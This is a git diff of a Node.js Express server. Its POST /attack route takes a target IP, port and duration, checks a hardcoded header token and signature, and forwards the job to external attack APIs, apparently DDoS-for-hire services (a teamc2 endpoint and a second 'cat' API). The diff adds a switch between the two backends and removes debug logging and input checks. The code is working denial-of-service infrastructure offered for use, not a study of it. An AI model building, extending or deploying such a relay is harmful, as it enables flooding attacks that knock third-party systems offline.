@@ -20,12 +20,14 @@ app.use(express.json());
 
 // ================= ENV =================
 const API_KEY = process.env.API_KEY;
-
-// ❗ IMPORTANT: NO fallback
 const PORT = process.env.PORT;
 
+// 🔥 MODE SWITCH (yaha control hoga)
+const MODE = process.env.MODE || "teamc2"; 
+// "teamc2" or "cat"
+
+console.log("MODE:", MODE);
 console.log("API_KEY:", API_KEY ? "Loaded ✅" : "Missing ❌");
-console.log("PORT FROM ENV:", PORT);
 
 // ================= 🔐 SECURITY =================
 const SECRET = "SECRET123";
@@ -36,33 +38,18 @@ function sha256(data) {
 
 // ================= ROUTES =================
 
-// ⚡ ultra-fast health (Railway ke liye critical)
 app.get("/", (req, res) => res.status(200).send("OK"));
-app.get("/health", (req, res) => res.status(200).send("OK"));
 
-// 🧪 debug route
-app.get("/debug", (req, res) => {
-  res.json({
-    status: "running",
-    port: PORT,
-    hasApiKey: !!API_KEY,
-    time: new Date().toISOString()
-  });
-});
-
-// ================= MAIN ROUTE =================
 app.post("/attack", async (req, res) => {
   try {
-    console.log("➡️ Incoming /attack request");
+    console.log("➡️ Incoming request");
 
+    // 🔐 basic security
     if (req.headers["x-sec"] !== "9xK3pL") {
-      console.log("❌ Invalid x-sec");
       return res.status(403).json({ error: "Forbidden" });
     }
 
     let { ip, port, time } = req.body;
-
-    console.log("📥 Body:", req.body);
 
     if (!ip || !port || !time) {
       return res.status(400).json({ error: "Missing params" });
@@ -71,57 +58,71 @@ app.post("/attack", async (req, res) => {
     port = Number(port);
     time = Number(time);
 
-    if (isNaN(port) || isNaN(time)) {
-      return res.status(400).json({ error: "Invalid port/time" });
-    }
-
     const expected = sha256(ip + port + time + SECRET);
 
     if (req.headers["x-sign"] !== expected) {
-      console.log("❌ Invalid signature");
       return res.status(403).json({ error: "Invalid sign" });
     }
 
-    if (!API_KEY) {
-      console.log("❌ API key missing");
-      return res.status(500).json({ error: "API key missing" });
+    // ================= 🔥 SWITCH =================
+
+    let response;
+
+    if (MODE === "teamc2") {
+      // 🔹 OLD API
+      if (!API_KEY) {
+        return res.status(500).json({ error: "API key missing" });
+      }
+
+      const url = `https://app.teamc2.xyz/api/attack?api_key=${API_KEY}&target=${ip}&port=${port}&time=${time}&concurrent=1`;
+
+      console.log("🌐 TEAMC2 CALL");
+
+      response = await axios.get(url, { timeout: 10000 });
+
+    } else if (MODE === "cat") {
+      // 🔹 NEW API (JSON POST)
+      console.log("🌐 CAT API CALL");
+
+      response = await axios.post(
+        "https://api-cat-ecru.vercel.app/",
+        {
+          ip,
+          port,
+          time
+        },
+        {
+          headers: {
+            "Content-Type": "application/json"
+          },
+          timeout: 10000
+        }
+      );
+
+    } else {
+      return res.status(400).json({ error: "Invalid mode" });
     }
-
-    const url = `https://app.teamc2.xyz/api/attack?api_key=${API_KEY}&target=${ip}&port=${port}&time=${time}&concurrent=1`;
-
-    console.log("🌐 Calling API:", url);
-
-    const response = await axios.get(url, { timeout: 10000 });
-
-    console.log("✅ API success");
 
     return res.json({
       success: true,
-      data: response.data,
+      data: response.data
     });
 
   } catch (err) {
-    console.error("🔥 ROUTE ERROR:", err?.response?.data || err.message);
+    console.error("🔥 ERROR:", err?.response?.data || err.message);
 
     return res.status(500).json({
-      error: err?.response?.data || "Server error",
+      error: err?.response?.data || "Server error"
     });
   }
 });
 
 // ================= START =================
-
-// ❗ fail fast if no PORT
 if (!PORT) {
-  console.error("❌ PORT not provided by Railway!");
+  console.error("❌ PORT missing");
   process.exit(1);
 }
 
-const server = app.listen(PORT, () => {
-  console.log(`🚀 Server running on port ${PORT}`);
+app.listen(PORT, () => {
+  console.log(`🚀 Running on ${PORT}`);
 });
-
-// ================= KEEP ALIVE =================
-setInterval(() => {
-  console.log("💓 keep-alive ping", new Date().toISOString());
-}, 30000);
